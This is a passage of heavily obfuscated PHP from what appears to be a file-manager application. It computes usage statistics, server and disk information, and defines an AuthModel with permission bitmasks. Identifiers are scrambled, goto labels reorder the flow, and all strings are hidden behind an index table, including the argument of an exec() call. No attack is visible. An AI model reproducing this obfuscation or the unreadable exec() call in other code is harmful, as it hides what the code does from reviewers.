Model($CÁªÛù©ª•[501])->where($c»ØºØ’å)->count($CÁªÛù©ª•[1504]); $c»ØºØ’å[$CÁªÛù©ª•[29]] = $CÁªÛù©ª•[1607]; $Eà§™´º™“ = Model($CÁªÛù©ª•[1608])->where($c»ØºØ’å)->count($CÁªÛù©ª•[1609]); goto b‚¾×Æ—Í‚; b‚¾×Æ—Í‚: $C„ê¤ßîó‰ = array($CÁªÛù©ª•[220] => $AÈİ„Ê¼², $CÁªÛù©ª•[716] => (int) $Aà£‡ˆîÚË, $CÁªÛù©ª•[1594] => (int) $b¨Íç¯Òç¢, $CÁªÛù©ª•[1595] => (int) $Eà§™´º™“); return $this->insert($C„ê¤ßîó‰); goto fÍ¿Ÿò×ˆ; E»™Èö‹Ù¢: $CÁªÛù©ª• =& $_SERVER[¹…ÕÄ]; $FŞ¬œò˜‚à = strtotime(date($CÁªÛù©ª•[1605], strtotime($AÈİ„Ê¼²))); $a¡Ÿİ—í = strtotime(date($CÁªÛù©ª•[1606], strtotime($AÈİ„Ê¼²))); goto FŒ¸òÚ´ä; fÍ¿Ÿò×ˆ: } public function _recordStore($CÓ–Ñ³ß¥‰ = '') { goto CÆß ´ò¬; EèŠÅï–¨: $C‚ª÷çµ¤Ê = Model($eñ×à«Œ·[444])->where($Bæ¾Ó•ÜÌÜ)->sum($eñ×à«Œ·[77]); $Bæ¾Ó•ÜÌÜ[$eñ×à«Œ·[397]] = 0; $f„‚„Ô£Ü‹ = Model($eñ×à«Œ·[770])->where($Bæ¾Ó•ÜÌÜ)->sum($eñ×à«Œ·[77]); goto f½„©’†ñÊ; CÆß ´ò¬: $eñ×à«Œ· =& $_SERVER[¹…ÕÄ]; $Eç„‡ø×ôÍ = strtotime(date($eñ×à«Œ·[1606], strtotime($CÓ–Ñ³ß¥‰))); $Bæ¾Ó•ÜÌÜ = array($eñ×à«Œ·[192] => array($eñ×à«Œ·[949], $Eç„‡ø×ôÍ)); goto EèŠÅï–¨; dÁÄÎğ—á¨: $bÊ¼Ïá¡ƒƒ = Model($eñ×à«Œ·[770])->where($Bæ¾Ó•ÜÌÜ)->sum($eñ×à«Œ·[77]); $e¿ï”¦â‹ = array($eñ×à«Œ·[220] => $CÓ–Ñ³ß¥‰, $eñ×à«Œ·[714] => (int) $f„‚„Ô£Ü‹, $eñ×à«Œ·[1598] => (int) $C‚ª÷çµ¤Ê, $eñ×à«Œ·[1599] => (int) $eåÚéÈßí¯, $eñ×à«Œ·[1600] => (int) $bÊ¼Ïá¡ƒƒ); return $this->insert($e¿ï”¦â‹); goto c¼Ñµô„ÑÀ; f½„©’†ñÊ: $Bæ¾Ó•ÜÌÜ[$eñ×à«Œ·[398]] = 1; $eåÚéÈßí¯ = Model($eñ×à«Œ·[770])->where($Bæ¾Ó•ÜÌÜ)->sum($eñ×à«Œ·[77]); $Bæ¾Ó•ÜÌÜ[$eñ×à«Œ·[398]] = 2; goto dÁÄÎğ—á¨; c¼Ñµô„ÑÀ: } public function trend($E»ÄäÅ°İ², $B¿¸†ÔÌò¸) { goto BŒ©”†™½Ñ; bñí×ŠÛÒ: if (empty($D”š¡¾àšĞ)) { $BäÜ‹–Œ‘Å = date($dœèš›ª„·[1601], strtotime($dœèš›ª„·[1602])); $aÕÑòŸïÂš = array($dœèš›ª„·[220] => $BäÜ‹–Œ‘Å); foreach ($cñóƒõìââ[$E»ÄäÅ°İ²] as $AÕÆ½ÌÈ–Ñ => $fĞ…É†Ãî) { $aÕÑòŸïÂš[$AÕÆ½ÌÈ–Ñ] = 0; } $D”š¡¾àšĞ[] = $aÕÑòŸïÂš; } $b×¯÷ÈÊä¼ = array(); foreach ($D”š¡¾àšĞ as $fĞ…É†Ãî) { if ($E»ÄäÅ°İ² == $dœèš›ª„·[1596] && $fĞ…É†Ãî[$dœèš›ª„·[1598]] > $fĞ…É†Ãî[$dœèš›ª„·[714]]) { $fĞ…É†Ãî[$dœèš›ª„·[1598]] = $fĞ…É†Ãî[$dœèš›ª„·[714]]; } foreach ($cñóƒõìââ[$E»ÄäÅ°İ²] as $AÕÆ½ÌÈ–Ñ => $f´ÎßäƒÇÄ) { $A­¤ò·¹›¦ = array($dœèš›ª„·[220] => $fĞ…É†Ãî[$dœèš›ª„·[220]], $dœèš›ª„·[1409] => $f´ÎßäƒÇÄ); $A­¤ò·¹›¦[$e´ÚÖğ¹[$E»ÄäÅ°İ²]] = isset($fĞ…É†Ãî[$AÕÆ½ÌÈ–Ñ]) ? $fĞ…É†Ãî[$AÕÆ½ÌÈ–Ñ] : 0; $b×¯÷ÈÊä¼[] = $A­¤ò·¹›¦; } } goto C¨š´†ØÊ; FÊ›×ã‰‹Á: if ($D”š¡¾àšĞ && $B¿¸†ÔÌò¸ != $dœèš›ª„·[1478]) { $FÁ¡¶Ú›õæ = $D”š¡¾àšĞ[0][$dœèš›ª„·[220]]; $aÓßºòìÆ = $this->validDate($B¿¸†ÔÌò¸, $FÁ¡¶Ú›õæ); $C«ÃóÆÀä = array(); $E„Ã™ŠÕ‡‘ = array_to_keyvalue($D”š¡¾àšĞ, $dœèš›ª„·[220]); foreach ($aÓßºòìÆ as $BäÜ‹–Œ‘Å) { if (isset($E„Ã™ŠÕ‡‘[$BäÜ‹–Œ‘Å])) { $A­¤ò·¹›¦ = $E„Ã™ŠÕ‡‘[$BäÜ‹–Œ‘Å]; } else { $A­¤ò·¹›¦ = end($D”š¡¾àšĞ); $A­¤ò·¹›¦[$dœèš›ª„·[220]] = $BäÜ‹–Œ‘Å; if ($E»ÄäÅ°İ² == $dœèš›ª„·[557]) { $A­¤ò·¹›¦[$dœèš›ª„·[1594]] = $A­¤ò·¹›¦[$dœèš›ª„·[1595]] = 0; } } $C«ÃóÆÀä[] = $A­¤ò·¹›¦; } $D”š¡¾àšĞ = $C«ÃóÆÀä; } $cñóƒõìââ = array($dœèš›ª„·[557] => array($dœèš›ª„·[716] => LNG($dœèš›ª„·[1610]), $dœèš›ª„·[1594] => LNG($dœèš›ª„·[1611]), $dœèš›ª„·[1595] => LNG($dœèš›ª„·[1612])), $dœèš›ª„·[1596] => array($dœèš›ª„·[714] => LNG($dœèš›ª„·[1613]), $dœèš›ª„·[1598] => LNG($dœèš›ª„·[1614]), $dœèš›ª„·[1599] => LNG($dœèš›ª„·[1615]), $dœèš›ª„·[1600] => LNG($dœèš›ª„·[1616]))); $e´ÚÖğ¹ = array($dœèš›ª„·[557] => $dœèš›ª„·[1617], $dœèš›ª„·[1596] => $dœèš›ª„·[77]); goto bñí×ŠÛÒ; BŒ©”†™½Ñ: $dœèš›ª„· =& $_SERVER[¹…ÕÄ]; if (!$this->init($E»ÄäÅ°İ²)) { return !1; } $D”š¡¾àšĞ = $this->trendList($E»ÄäÅ°İ²); goto FÊ›×ã‰‹Á; C¨š´†ØÊ: return $b×¯÷ÈÊä¼; goto Fš”õÌ¶â³; Fš”õÌ¶â³: } public function validDate($AŞ£ŠŠ÷Êõ, $bÃ†¿Î²Ôë) { goto Aâ ¡´ğÜ×; Aâ ¡´ğÜ×: $d˜­ÂÛ¨ô =& $_SERVER[¹…ÕÄ]; $dõà¦ø”ÚÏ = date($d˜­ÂÛ¨ô[1601], strtotime($d˜­ÂÛ¨ô[1602])); $AÛšòà­Ïİ = array($dõà¦ø”ÚÏ); goto F‚çùÛŠÆ…; F‚çùÛŠÆ…: switch ($AŞ£ŠŠ÷Êõ) { case $d˜­ÂÛ¨ô[1485]: $e™”é–’²¨ = mktime(0, 0, 0, date($d˜­ÂÛ¨ô[1618]), date($d˜­ÂÛ¨ô[1229]) - date($d˜­ÂÛ¨ô[1292]) + 7 - 7, date($d˜­ÂÛ¨ô[1619])); $AŸ„×éÒ = 0; do { $CÅ‘é“íƒ™ = date($d˜­ÂÛ¨ô[1601], $e™”é–’²¨ - 3600 * 24 * 7 * $AŸ„×éÒ); $AÛšòà­Ïİ[] = $CÅ‘é“íƒ™; $AŸ„×éÒ++; } while ($bÃ†¿Î²Ôë < $CÅ‘é“íƒ™); break; case $d˜­ÂÛ¨ô[1483]: $AŸ„×éÒ = 1; do { $a®ŠĞ‰’Šœ = date($d˜­ÂÛ¨ô[1620], strtotime("\x2d\40{$AŸ„×éÒ}\x20\x6d\157\x6e\x74\x68\x73")); $AÛšòà­Ïİ[] = $a®ŠĞ‰’Šœ; $AŸ„×éÒ++; } while ($bÃ†¿Î²Ôë < $a®ŠĞ‰’Šœ); break; case $d˜­ÂÛ¨ô[1621]: $fÉÍÇàÍø’ = (int) date($d˜­ÂÛ¨ô[1619], strtotime($bÃ†¿Î²Ôë)); $D¯¿øº³Æ = (int) date($d˜­ÂÛ¨ô[1619]); if ($fÉÍÇàÍø’ >= $D¯¿øº³Æ) { break; } for ($fÉÍÇàÍø’; $fÉÍÇàÍø’ < $D¯¿øº³Æ; $fÉÍÇàÍø’++) { $AÛšòà­Ïİ[] = $fÉÍÇàÍø’ . $d˜­ÂÛ¨ô[1622]; } break; default: break; } if ($bÃ†¿Î²Ôë > end($AÛšòà­Ïİ)) { array_pop($AÛšòà­Ïİ); } sort($AÛšòà­Ïİ); goto dòÂ“é¤”Œ; dòÂ“é¤”Œ: return $AÛšòà­Ïİ; goto fçÃÙ£„öË; fçÃÙ£„öË: } public function listTable($BĞ²ªº†¨¢) { $C¼‚Á = ucfirst($BĞ²ªº†¨¢); return Model($C¼‚Á)->listData(); } public function option($a«ŒİˆËé) { $Dª„Û¦Šˆ = $_SERVER[¹…ÕÄ][1623] . ucfirst($a«ŒİˆËé); return $this->{$Dª„Û¦Šˆ}(); } private function optionUser() { goto a ²ïçìô; a ²ïçìô: $A‚Ôòäˆ§ =& $_SERVER[¹…ÕÄ]; $Bƒ²ŒŒ‹º´ = Model($A‚Ôòäˆ§[501])->count($A‚Ôòäˆ§[1504]); $C›Ç¹ß»ŞŒ = Model($A‚Ôòäˆ§[501])->where($A‚Ôòäˆ§[1624])->count($A‚Ôòäˆ§[1504]); goto D‡¸Çòõ¡Ó; fˆ·ß÷ã£É: $A’äÄõ½İ = (int) Model($A‚Ôòäˆ§[501])->where($Cˆâ±ÌÙ˜)->count($A‚Ôòäˆ§[1504]); if (!$A’äÄõ½İ) { $A’äÄõ½İ = 1; } $A‰ªì™¹» = strtotime(date($A‚Ôòäˆ§[1605])); goto A×§¬›×; A×§¬›×: $Cˆâ±ÌÙ˜ = array($A‚Ôòäˆ§[1625] => array($A‚Ôòäˆ§[950], $A‰ªì™¹»)); $cÊÜÍÔ³É = Model($A‚Ôòäˆ§[501])->where($Cˆâ±ÌÙ˜)->count($A‚Ôòäˆ§[1504]); return array($A‚Ôòäˆ§[711] => (int) $Bƒ²ŒŒ‹º´, $A‚Ôòäˆ§[1626] => (int) ($Bƒ²ŒŒ‹º´ - $C›Ç¹ß»ŞŒ), $A‚Ôòäˆ§[1627] => (int) $C›Ç¹ß»ŞŒ, $A‚Ôòäˆ§[1628] => (int) $cÊÜÍÔ³É, $A‚Ôòäˆ§[1629] => $A’äÄõ½İ); goto DĞßãÄ‰ø; D‡¸Çòõ¡Ó: $b­îßÁ””ª = intval($GLOBALS[$A‚Ôòäˆ§[6]][$A‚Ôòäˆ§[345]][$A‚Ôòäˆ§[1463]]) / 3600; $A‰ªì™¹» = strtotime("\x2d{$b­îßÁ””ª}\x20\x68\157\165\x72\x73"); $Cˆâ±ÌÙ˜ = array($A‚Ôòäˆ§[1625] => array($A‚Ôòäˆ§[950], $A‰ªì™¹»)); goto fˆ·ß÷ã£É; DĞßãÄ‰ø: } private function optionFile() { goto E§âØÜ‹ÇÙ; E§âØÜ‹ÇÙ: $dŠóˆ‰’²ó =& $_SERVER[¹…ÕÄ]; $bªá¥Ş‰Ì = $this->sourceSize(); $Aå»½ˆ÷¸î = $bªá¥Ş‰Ì[$dŠóˆ‰’²ó[77]]; goto b‡ğ¤¯éÀ; Fä‰£Ë«Ê : $AßÃîàÓ¾Ò = Model($dŠóˆ‰’²ó[770])->where($fùĞÚ‹•¸Ï)->sum($dŠóˆ‰’²ó[77]); $Fõƒ¤ÙÛ» = Model($dŠóˆ‰’²ó[770])->where($fùĞÚ‹•¸Ï)->count($dŠóˆ‰’²ó[390]); return array($dŠóˆ‰’²ó[714] => $Aå»½ˆ÷¸î, $dŠóˆ‰’²ó[1598] => $B­´Òööìİ, $dŠóˆ‰’²ó[1630] => $Aå»½ˆ÷¸î - $B­´Òööìİ, $dŠóˆ‰’²ó[1631] => (int) $AßÃîàÓ¾Ò, $dŠóˆ‰’²ó[716] => (int) $E—½—ñ¸, $dŠóˆ‰’²ó[1632] => (int) $Fõƒ¤ÙÛ»); goto a¶”‰íäµÖ; b‡ğ¤¯éÀ: $B­´Òööìİ = $bªá¥Ş‰Ì[$dŠóˆ‰’²ó[1598]]; $E—½—ñ¸ = Model($dŠóˆ‰’²ó[770])->where(array($dŠóˆ‰’²ó[397] => 0))->count($dŠóˆ‰’²ó[390]); $fùĞÚ‹•¸Ï = array($dŠóˆ‰’²ó[397] => 0, $dŠóˆ‰’²ó[192] => array($dŠóˆ‰’²ó[950], strtotime(date($dŠóˆ‰’²ó[1605])))); goto Fä‰£Ë«Ê ; a¶”‰íäµÖ: } private function optionAccess() { $cÍ¿¾Ç§Š„ =& $_SERVER[¹…ÕÄ]; return array($cÍ¿¾Ç§Š„[711] => $this->typeLogCnt(), $cÍ¿¾Ç§Š„[106] => $this->typeLogCnt($cÍ¿¾Ç§Š„[106]), $cÍ¿¾Ç§Š„[424] => $this->typeLogCnt($cÍ¿¾Ç§Š„[424]), $cÍ¿¾Ç§Š„[1633] => $this->typeLogCnt($cÍ¿¾Ç§Š„[1633]), $cÍ¿¾Ç§Š„[1634] => $this->typeLogCnt($cÍ¿¾Ç§Š„[1634]), $cÍ¿¾Ç§Š„[557] => $this->typeLogCnt($cÍ¿¾Ç§Š„[33], $cÍ¿¾Ç§Š„[1609])); } private function typeLogCnt($Dë…‘¦éŞá = '', $dØ™É£éÛÌ = "\151\x64") { goto e”©ĞÅ½¿Ï; e”©ĞÅ½¿Ï: $b–î£“Æ =& $_SERVER[¹…ÕÄ]; $B¶Ä•÷óÁÅ = array($b–î£“Æ[106] => array($b–î£“Æ[1635], $b–î£“Æ[1636]), $b–î£“Æ[424] => array($b–î£“Æ[1637], $b–î£“Æ[1638]), $b–î£“Æ[1633] => array($b–î£“Æ[1639], $b–î£“Æ[1640], $b–î£“Æ[1641]), $b–î£“Æ[1634] => array($b–î£“Æ[1642], $b–î£“Æ[1643]), $b–î£“Æ[1644] => array($b–î£“Æ[1645], $b–î£“Æ[1646], $b–î£“Æ[1647])); $dŸ¹¹ŞÄ¤È = strtotime(date($b–î£“Æ[1605])); goto aÁËÒšÂ; cÍ‚ÛˆĞ†: return (int) $f…Â¸á¿ˆ—; goto aÒŠ„Ïñ‰ˆ; aÁËÒšÂ: $fô›ä¼®†Ì = array($b–î£“Æ[192] => array($b–î£“Æ[950], $dŸ¹¹ŞÄ¤È)); if ($Dë…‘¦éŞá) { $fô›ä¼®†Ì[$b–î£“Æ[29]] = array($b–î£“Æ[7], $B¶Ä•÷óÁÅ[$Dë…‘¦éŞá]); } $f…Â¸á¿ˆ— = Model($b–î£“Æ[1608])->where($fô›ä¼®†Ì)->count($dØ™É£éÛÌ); goto cÍ‚ÛˆĞ†; aÒŠ„Ïñ‰ˆ: } private function optionServer() { goto Dë”ƒ‚ ÓÍ; Dë”ƒ‚ ÓÍ: $C‡´ôâÙµ =& $_SERVER[¹…ÕÄ]; $BŒœÕœì±Ä = $this->diskDriver(); $fã÷•çìö = KodIO::defaultDriver(); goto D½Ò›†¦’; Dòå”ĞğÖ: return array($C‡´ôâÙµ[1650] => $BŒœÕœì±Ä ? $BŒœÕœì±Ä[$C‡´ôâÙµ[1651]] : 0, $C‡´ôâÙµ[1652] => $BŒœÕœì±Ä ? $BŒœÕœì±Ä[$C‡´ôâÙµ[1653]] : 0, $C‡´ôâÙµ[1654] => (int) $fã÷•çìö[$C‡´ôâÙµ[1651]] * 1024 * 1024 * 1024, $C‡´ôâÙµ[1655] => (int) $A¥º¸ìïÔ, $C‡´ôâÙµ[1656] => ucfirst($eõ™«Œ…“´), $C‡´ôâÙµ[1657] => $C‡´ôâÙµ[1658] . PHP_VERSION, $C‡´ôâÙµ[1659] => phpBuild64() ? 64 : 32, $C‡´ôâÙµ[710] => str_replace($C‡´ôâÙµ[1660], $C‡´ôâÙµ[927], $e•ôèõÂëé), $C‡´ôâÙµ[345] => ucfirst($c‘ÒÇ”ñ©ê), $C‡´ôâÙµ[28] => $_SERVER[$C‡´ôâÙµ[1661]]); goto dËÁ«Ô ï¬; a“×Š×¼å: if ($e•ôèõÂëé == $C‡´ôâÙµ[741]) { $f£Ä‡Ê¤ˆ = explode($C‡´ôâÙµ[1144], $bø‰ƒÛøÂÈ[$C‡´ôâÙµ[910]]); $e•ôèõÂëé = $f£Ä‡Ê¤ˆ[0]; } if ($e•ôèõÂëé == $C‡´ôâÙµ[744] || $e•ôèõÂëé == $C‡´ôâÙµ[745]) { $BÌ¿’¬ÍÈ‚ = Model()->db()->query($C‡´ôâÙµ[1648]); $dç¼Î´†£¸ = $BÌ¿’¬ÍÈ‚[0] && isset($BÌ¿’¬ÍÈ‚[0][$C‡´ôâÙµ[1408]]) ? $BÌ¿’¬ÍÈ‚[0][$C‡´ôâÙµ[1408]] : 0; $e•ôèõÂëé = $C‡´ôâÙµ[1649] . ($dç¼Î´†£¸ ? $C‡´ôâÙµ[8] . $dç¼Î´†£¸ : $C‡´ôâÙµ[33]); } $c‘ÒÇ”ñ©ê = $GLOBALS[$C‡´ôâÙµ[6]][$C‡´ôâÙµ[345]][$C‡´ôâÙµ[772]]; goto Dòå”ĞğÖ; cÜñ›‚¸†: $eõ™«Œ…“´ = $E´ğ³¼òË[0]; $bø‰ƒÛøÂÈ = $GLOBALS[$C‡´ôâÙµ[6]][$C‡´ôâÙµ[17]]; $e•ôèõÂëé = $bø‰ƒÛøÂÈ[$C‡´ôâÙµ[911]]; goto a“×Š×¼å; D½Ò›†¦’: $f§èƒ³ØØ° = array($C‡´ôâÙµ[763] => $fã÷•çìö[$C‡´ôâÙµ[388]]); $A¥º¸ìïÔ = Model($C‡´ôâÙµ[444])->where($f§èƒ³ØØ°)->sum($C‡´ôâÙµ[77]); $E´ğ³¼òË = explode($C‡´ôâÙµ[50], $_SERVER[$C‡´ôâÙµ[141]]); goto cÜñ›‚¸†; dËÁ«Ô ï¬: } private function diskDriver() { goto a˜’Ê®ø°‹; fÁäÊÆ­Í: $E‰éÑæˆÃÍ = $f¡ˆçõ“¶ - @disk_free_space($Aéò¼Á¡öÄ); return array($D±Ã¡óé£Î[1651] => $f¡ˆçõ“¶, $D±Ã¡óé£Î[1653] => $E‰éÑæˆÃÍ); goto FºïÃ‰ÃÃÖ; a˜’Ê®ø°‹: $D±Ã¡óé£Î =& $_SERVER[¹…ÕÄ]; $Aéò¼Á¡öÄ = $D±Ã¡óé£Î[8]; $C¤ÒÒò²Ï¥ = $GLOBALS[$D±Ã¡óé£Î[6]][$D±Ã¡óé£Î[1662]] == $D±Ã¡óé£Î[1663]; goto AĞæÛ‘¦“«; AĞæÛ‘¦“«: if ($C¤ÒÒò²Ï¥) { $Aéò¼Á¡öÄ = $D±Ã¡óé£Î[1664]; if (function_exists($D±Ã¡óé£Î[1665])) { exec($D±Ã¡óé£Î[1666], $eùƒ»ö¸‚À); $Aéò¼Á¡öÄ = $eùƒ»ö¸‚À[1] . $D±Ã¡óé£Î[8]; } } if (!file_exists($Aéò¼Á¡öÄ)) { return; } $f¡ˆçõ“¶ = @disk_total_space($Aéò¼Á¡öÄ); goto fÁäÊÆ­Í; FºïÃ‰ÃÃÖ: } public function fileChart($BñÁ™ÒÑÙÈ) { goto eŞÙÓ¡¹·£; eŞÙÓ¡¹·£: $dØÄœ•Ÿ¯ =& $_SERVER[¹…ÕÄ]; if (isset($BñÁ™ÒÑÙÈ[$dØÄœ•Ÿ¯[1504]])) { return Model($dØÄœ•Ÿ¯[770])->userFileTypeProfile($BñÁ™ÒÑÙÈ[$dØÄœ•Ÿ¯[1504]]); } if (isset($BñÁ™ÒÑÙÈ[$dØÄœ•Ÿ¯[1667]])) { return Model($dØÄœ•Ÿ¯[770])->groupFileTypeProfile($BñÁ™ÒÑÙÈ[$dØÄœ•Ÿ¯[1667]]); } goto aßÀ×„¶«; CôíÔ†¾àƒ: $dßÇÄª[$dØÄœ•Ÿ¯[398]] = 2; $Cà‰Ëê›õ“ = Model($dØÄœ•Ÿ¯[770])->where($dßÇÄª)->sum($dØÄœ•Ÿ¯[77]); return array($dØÄœ•Ÿ¯[714] => $f¹öÌÍêÚ‚[$dØÄœ•Ÿ¯[77]], $dØÄœ•Ÿ¯[1598] => $f¹öÌÍêÚ‚[$dØÄœ•Ÿ¯[1598]], $dØÄœ•Ÿ¯[1599] => (int) $eÏ‚Ã¸Õ“˜, $dØÄœ•Ÿ¯[1600] => (int) $Cà‰Ëê›õ“); goto B°ÇÊ¼»´; aßÀ×„¶«: $f¹öÌÍêÚ‚ = $this->sourceSize(); $dßÇÄª = array($dØÄœ•Ÿ¯[472] => 0, $dØÄœ•Ÿ¯[398] => 1); $eÏ‚Ã¸Õ“˜ = Model($dØÄœ•Ÿ¯[770])->where($dßÇÄª)->sum($dØÄœ•Ÿ¯[77]); goto CôíÔ†¾àƒ; B°ÇÊ¼»´: } private function sourceSize() { $dâ˜çÎì£„ =& $_SERVER[¹…ÕÄ]; $A›ºµˆ¨Ä• = Model($dâ˜çÎì£„[770])->where(array($dâ˜çÎì£„[397] => 0))->sum($dâ˜çÎì£„[77]); $F¹æØğŸãÒ = Model($dâ˜çÎì£„[444])->sum($dâ˜çÎì£„[77]); if ($F¹æØğŸãÒ > $A›ºµˆ¨Ä•) { $F¹æØğŸãÒ = $A›ºµˆ¨Ä•; } return array($dâ˜çÎì£„[77] => (int) $A›ºµˆ¨Ä•, $dâ˜çÎì£„[1598] => (int) $F¹æØğŸãÒ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $fùÅĞÂ¦í¥ =& $_SERVER[¹…ÕÄ]; $eâ›¡Ù’ïã = array(array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1668]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1670], $fùÅĞÂ¦í¥[1671] => 1, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1674]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1675], $fùÅĞÂ¦í¥[1671] => 2, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1676]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1677], $fùÅĞÂ¦í¥[1671] => 3, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1678]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1679], $fùÅĞÂ¦í¥[1671] => 4, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_VIEW), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1680]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1681], $fùÅĞÂ¦í¥[1671] => 5, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1682]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1683], $fùÅĞÂ¦í¥[1671] => 6, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($fùÅĞÂ¦í¥[407] => LNG($fùÅĞÂ¦í¥[1684]), $fùÅĞÂ¦í¥[1669] => $fùÅĞÂ¦í¥[1685], $fùÅĞÂ¦í¥[1671] => 7, $fùÅĞÂ¦í¥[1672] => 1, $fùÅĞÂ¦í¥[1673] => 0)); return $eâ›¡Ù’ïã; } public static function authCheck($fÖ÷½‡¯„ù, $E—‡˜™‰´) { $fÖ÷½‡¯„ù = intval($fÖ÷½‡¯„ù); if ($GLOBALS[$_SERVER[¹…ÕÄ][479]]) { return !0; } if ($fÖ÷½‡¯„ù <= 0) { return !1; } if (($fÖ÷½‡¯„ù & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fÖ÷½‡¯„ù & $E—‡˜™‰´); } public static function authCheckShow($EØ¯ïù©Ğ) { return self::authCheck($EØ¯ïù©Ğ, self::AUTH_SHOW); } public static function authCheckView($bÛô¿ñ„˜‘) { return self::authCheck($bÛô¿ñ„˜‘, self::AUTH_VIEW); } public static function authCheckDownload($dØ²¦šöŸö) { return self::authCheck($dØ²¦šöŸö, self::AUTH_DOWNLOAD); } public static function authCheckUpload($fÊ‘ÆÆìà„) { return self::authCheck($fÊ‘ÆÆìà„, self::AUTH_UPLOAD); } public static function authCheckEdit($e¼¬ßéÑ‚) { return self::authCheck($e¼¬ßéÑ‚, self::AUTH_EDIT); } public static function authCheckRemove($Dº——°º) { return self::authCheck($Dº——°º, self::AUTH_REMOVE); } public static function authCheckShare($fÚ¾ÕòÇóÚ) { return self::authCheck($fÚ¾ÕòÇóÚ, self::AUTH_SHARE); } public static function authCheckComment($Fä„ÊšÊÉ¢) { return self::authCheck($Fä„ÊšÊÉ¢, self::AUTH_COMMENT); } public static function authCheckEvent($FíµÎëõ) { return self::authCheck($FíµÎëõ, self::AUTH_EVENT); } public static function authCheckRoot($cÑØ±æË‰) { return self::authCheck($cÑØ±æË‰, self::AUTH_ROOT); } public static function authCheckAction($dèªÛÊµ“³, $cŸ°¥š—°) { goto F´¡¿Ëëá; bÃ”ÁÎ¨Îˆ: $b¾ß‘‡½ç” = $Fñìó„‚ää[$cŸ°¥š—°]; $dèªÛÊµ“³ = intval($dèªÛÊµ“³); if ($dèªÛÊµ“³ <= 0) { return !1; } goto d„âÈ¹§ğ; d„âÈ¹§ğ: if (($dèªÛÊµ“³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dèªÛÊµ“³ & $b¾ß‘‡½ç”); goto eÈâ«•’ù; F´¡¿Ëëá: $eƒõ†ãÖ÷ =& $_SERVER[¹…ÕÄ]; $Fñìó„‚ää = array($eƒõ†ãÖ÷[1686] => self::AUTH_VIEW, $eƒõ†ãÖ÷[1072] => self::AUTH_DOWNLOAD, $eƒõ†ãÖ÷[106] => self::AUTH_UPLOAD, $eƒõ†ãÖ÷[1634] => self::AUTH_EDIT, $eƒõ†ãÖ÷[1633] => self::AUTH_REMOVE, $eƒõ†ãÖ÷[1644] => self::AUTH_SHARE, $eƒõ†ãÖ÷[350] => self::AUTH_COMMENT, $eƒõ†ãÖ÷[1493] => self::AUTH_EVENT, $eƒõ†ãÖ÷[1687] => self::AUTH_ROOT); if (!isset($Fñìó„‚ää[$cŸ°¥š—°])) { return; } goto bÃ”ÁÎ¨Îˆ; eÈâ«•’ù: } public static function authDisable($d˜ŸŒäçÚ§, $Aİé‘Î–ô¨) { if (intval($d˜ŸŒäçÚ§) <= 0) { return 0; } return intval($d˜ŸŒäçÚ§) & ~$Aİé‘Î–ô¨; } public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x73\x6f\165\x72\143\x65\x41\x75\x74\150\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\141\x75\x74\x68", "\154\x61\142\145\154", "\x64\151\x73\160\154\x61\171", "\x73\x79\163\x74\145\155", "\x73\157\x72\x74"); public function initData() { $D„Èó°†Éé = $this->authDefault(); foreach ($D„Èó°†Éé as $FËöëóêµÔ) { $this->add($FËöëóêµÔ); } } public function listData($E…°†Ğ©‚“ = false, $câÇ»­¼Ü = "\x73\x6f\162\x74", $FÉ¾çñ©®´ = false) { return parent::listData($E…°†Ğ©‚“, $câÇ»­¼Ü, $FÉ¾çñ©®´); } public function update($F–‡Öñî, $eµõåÅ‰ŠÈ) { $cİ¾åäöˆ´ =& 